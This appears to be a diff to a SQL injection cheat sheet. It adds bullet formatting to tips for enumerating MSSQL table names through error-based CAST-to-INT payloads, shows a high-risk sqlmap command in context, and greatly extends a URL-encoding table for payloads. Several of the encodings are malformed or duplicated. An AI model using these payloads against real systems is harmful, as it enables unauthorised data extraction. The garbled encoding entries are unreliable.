@@ -267,11 +267,11 @@ OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) AS INT);
 
 Tips:
 
-    Keep incrementing the OFFSET to walk through the table names.
+    - Keep incrementing the OFFSET to walk through the table names.
 
-    Use a script if possible to automate it.
+    - Use a script if possible to automate it.
 
-    Make note of each table name from the error message.
+     -Make note of each table name from the error message.
 
 ```sql
 CAST((SELECT name FROM app.sys.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) AS INT)
@@ -707,11 +707,86 @@ sqlmap -r burp_request.txt --batch --risk=3 --level=5 --technique=S
 
 ### URL-Encoded
 
-    - ;	                %3B
-    - space ( )	        %20
+    - space ()	%20
+    - ! 	%21
+    - " 	%22
+    - # 	%23
+    - $ 	%24
+    - % 	%25
+    - & 	%26
+    - ' 	%27
+    - ( 	%28
+    - ) 	%29
+    - * 	%2A
+    - + 	%2B
+    - , 	%2C
+    - - 	%2D
+    - . 	%2E
+    - ;	  %3B
+    - / 	%2F
     - ' (single quote)	%27
-    - =	                %3D
+    - =	  %3D
     - -- (comment) 	    -- or --+
+    - : 	%3A
+    - ; 	%3B
+    - < 	%3C
+    - = 	%3D
+    - > 	%3E
+    - ? 	%3F
+    - @ 	%40
+    - [ 	%5B
+    - \ 	%5C
+    - ] 	%5D
+    - ^ 	%5E
+    - _ 	%5F
+    - ` 	%60
+    - { 	%7B
+    - | 	%7C
+    - } 	%7D
+    - ~ 	%7E
+    - € %E2%82%AC
+    -  %81
+    - ‚ %E2%80%9A
+    - ƒ %C6%92
+    - „ %E2%80%9E
+    - … %E2%80%A6
+    - † %E2%80%A0
+    - ‡ %E2%80%A1
+    - ˆ %CB%86
+    - ‰ %E2%80%B0
+    - Š %C5%A0
+    - ‹ %E2%80%B9
+    - Œ %C5%92
+    -  %C5%8D
+    - Ž %C5%BD
+    -  %8F
+    -  %C2%90
+    - ‘ %E2%80%98
+    - ’ %E2%80%99
+    - “ %E2%80%9C
+    - ” %E2%80%9D
+    - • %E2%80%A2
+    - – %E2%80%93
+    - — %E2%80%94
+    - ˜ %CB%9C
+    - › %E2%80
+    - œ %C5%93
+    -  %9D
+    - ž %C5%BE
+    - Ÿ %C5%B8
+    - ¡ %C2%A1
+    - ¦ %C2%A6
+    - § %C2%A7
+    - ¨ %C2%A8
+    - © %C2%A9
+    - « %C2%AB
+    - ¬ %C2%AC
+    - ´ %C2%B4
+    - · %B7 %C2%B7
+    - ¸ %C2%B8
+    - ¹ %C2%B9
+    - º %C2%BA
+    - » %C2%BB
 
 ---
 
